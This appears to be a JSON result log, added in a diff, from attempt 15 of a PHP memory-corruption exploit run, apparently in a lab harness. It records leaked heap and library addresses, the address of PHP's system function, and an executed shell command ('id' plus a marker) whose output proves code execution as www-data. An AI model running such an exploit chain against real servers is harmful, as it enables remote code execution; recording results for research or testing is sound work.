@@ -1,0 +1,95 @@
+{
+ "attempt": 15,
+ "started": "2026-10-22T13:29:46Z",
+ "stages": [
+  {
+   "stage": "A1",
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "70dd84ee00ab12e983068e83199373cf750acfc71a7dc3aba92a47c20cbe645c",
+   "elapsed_s": 0.096
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 1689951,
+   "status": "HTTP/1.1 200 OK",
+   "elapsed_s": 0.067,
+   "leak": "hit",
+   "decoded": 819208,
+   "zdtor": "0x7f04bfe4db60",
+   "libphp": "0x7f04bf7ef000",
+   "buckets": [
+    [
+     "0x7f04bd400000",
+     7495
+    ],
+    [
+     "0x7f04bfe00000",
+     1095
+    ],
+    [
+     "0x7f04bdc00000",
+     87
+    ],
+    [
+     "0x7f04bd200000",
+     79
+    ]
+   ],
+   "main": "0x7f04bdc00000",
+   "cand_counts": {
+    "0x7f04bdc00000": 87,
+    "0x7f04bd200000": 79
+   }
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "sha256": "70dd84ee00ab12e983068e83199373cf750acfc71a7dc3aba92a47c20cbe645c",
+   "elapsed_s": 0.052
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "status": "",
+   "bytes": 0,
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "elapsed_s": 0.011,
+   "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n9BIE_MW_20261022T130520Z_A15_b0\n"
+  }
+ ],
+ "success": true,
+ "marker": "9BIE_MW_20261022T130520Z_A15",
+ "bodies": {
+  "a1": {
+   "bytes": 1060211,
+   "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+  },
+  "b1": {
+   "bytes": 33128677,
+   "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+  },
+  "a2": {
+   "bytes": 279369,
+   "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+  },
+  "b2_first": {
+   "bytes": 451384,
+   "sha256": "ee0adbfc4620f1b51b5202224de27a81dd20733c766089adab3507cc598b4950"
+  }
+ },
+ "S": "0x7f04bdcf8398",
+ "zif_system": "0x7f04bfc54370",
+ "b1_hit_attempt": 0,
+ "b2_cmd": "id>/out/p1_a15;echo 9BIE_MW_20261022T130520Z_A15_b0>>/out/p1_a15;id>&2;echo 9BIE_MW_20261022T130520Z_A15_b0>&2",
+ "b2_hit_attempt": 0,
+ "post_health": {
+  "status": "HTTP/1.1 200 OK",
+  "bytes": 195,
+  "body": "OK\n"
+ },
+ "finished": "2026-10-22T13:29:50Z"
+}
